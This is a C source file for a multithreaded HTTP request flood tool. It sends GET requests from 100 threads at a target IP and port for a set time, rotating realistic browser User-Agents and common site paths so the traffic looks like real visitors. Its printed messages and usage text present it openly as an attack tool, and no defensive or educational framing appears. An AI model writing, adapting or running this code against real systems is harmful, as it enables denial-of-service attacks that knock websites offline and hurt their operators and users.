#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

#define THREADS 100
#define MAX_REQUESTS 1000

// User-Agents realistas
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
};

// Paths comunes
const char *paths[] = {
    "/",
    "/index.html", 
    "/home",
    "/api/v1/users",
    "/blog",
    "/contact",
    "/products",
    "/search?q=test",
    "/login",
    "/register"
};

void *http_flood(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    time_t start = time(NULL);
    int request_count = 0;
    
    printf("[HTTP] Thread attacking %s:%d\n", ip, port);
    
    while(time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        
        // Timeout rápido
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Generar request HTTP realista
            char request[1024];
            int ua_idx = rand() % 5;
            int path_idx = rand() % 10;
            
            snprintf(request, sizeof(request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: close\r\n"
                "Cache-Control: max-age=0\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "\r\n",
                paths[path_idx], ip, user_agents[ua_idx]);
            
            // Enviar request
            send(sock, request, strlen(request), 0);
            request_count++;
            
            // Leer un poco de respuesta (opcional)
            char response[512];
            recv(sock, response, sizeof(response), 0);
            
            if(request_count % 100 == 0) {
                printf("[HTTP] %d requests sent to %s:%d\n", request_count, ip, port);
            }
        }
        
        close(sock);
        usleep(10000); // 10ms entre requests
    }
    
    printf("[HTTP] Thread finished: %d requests\n", request_count);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc != 4) {
        printf("HTTP Request Flood - Simple\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60\n", argv[0]);
        return 1;
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("\n[HTTP REQUEST FLOOD]\n");
    printf("Target: %s:%d\n", ip, port);
    printf("Duration: %d seconds\n", duration);
    printf("Threads: %d\n", THREADS);
    printf("Starting...\n\n");
    
    srand(time(NULL));
    
    pthread_t threads[THREADS];
    
    // Crear threads
    for(int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, http_flood, argv + 1);
    }
    
    // Esperar tiempo de duración
    sleep(duration);
    
    printf("\n[HTTP] Attack completed\n");
    return 0;
}
